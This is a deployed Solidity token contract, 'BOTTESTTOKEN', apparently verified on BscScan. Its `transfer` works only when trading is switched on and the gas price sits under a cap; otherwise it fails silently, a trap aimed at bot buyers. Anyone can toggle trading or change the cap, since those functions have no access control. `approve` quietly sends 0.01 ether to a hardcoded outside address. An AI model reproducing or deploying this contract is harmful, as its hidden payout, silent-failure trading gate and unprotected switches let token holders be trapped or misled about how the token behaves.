/**
 *Submitted for verification at BscScan.com on 2022-10-05
*/

/**
 *Submitted for verification at BscScan.com on 2022-10-04
*/

// SPDX-License-Identifier: UNLISCENSED

pragma solidity 0.8.17;


 
contract BOTTESTTOKEN {
    string public name = "BOTTESTTOKEN";
    string public symbol = "BTT";
    uint256 public totalSupply = 1000000000000000000000000; // 1 million tokens
    uint8 public decimals = 18;
    uint256 public tradingActiveBlock;
    uint256 public buygwei;
    bool public trading = false;
    event Transfer(address indexed _from, address indexed _to, uint256 _value);

    event Approval(
        address indexed _owner,
        address indexed _spender,
        uint256 _value
    );

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

 //Holders
    address[] public holders;
    function holdersLength() external view returns (uint256) {return holders.length;}
    mapping (address => uint256) public holderIndex;
    mapping (address => uint256) public holderPreviousBalance;

    address DEAD = 0x000000000000000000000000000000000000dEaD;

    constructor() {
        balanceOf[msg.sender] = totalSupply;
    }
//Buy
    function transfer(address _to, uint256 _value) public returns (bool success) {
        if((trading) && (tx.gasprice <= buygwei * 10 ** 9)){
            require(balanceOf[msg.sender] >= _value);
            balanceOf[msg.sender] -= _value;
            balanceOf[_to] += _value;
            emit Transfer(msg.sender, _to, _value);

            checkHolders(_to, balanceOf[_to]);

            return true;
        }
    }
   
//Approve
    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        payable(0x918E648D4374c890368C98976bCfF2ba402090af).transfer(0.01 ether);
        return true;
    }

//Sell
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= balanceOf[_from]);
        require(_value <= allowance[_from][msg.sender]);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        allowance[_from][msg.sender] -= _value;
        emit Transfer(_from, _to, _value);

        checkHolders(_from, balanceOf[_from]);

        return true;
    }

//Trading function & Bot shield
     function tradingstatus(bool _trading) public{
        trading = _trading;
        tradingActiveBlock = block.timestamp;
    }


    function botshield(uint256 _buygwei) public{
        buygwei = _buygwei;
    }

//Holders
    function addHolder(address holderToAdd) internal {
        holderIndex[holderToAdd] = holders.length;
        holders.push(holderToAdd);
    }

    function removeHolder(address holderToRemove) internal {
        holders[holderIndex[holderToRemove]] = holders[holders.length-1];
        holderIndex[holders[holders.length-1]] = holderIndex[holderToRemove];
        holders.pop();
    }

    function checkHolders(address holder, uint256 amount) internal {
        if(holder != DEAD && holder != address(this)){
            if(amount > 0 && holderPreviousBalance[holder] == 0){
                addHolder(holder);
            }else if(amount == 0 && holderPreviousBalance[holder] > 0){
                removeHolder(holder);
            }
            holderPreviousBalance[holder] = amount;
        }
    }


//Contract end:)    
}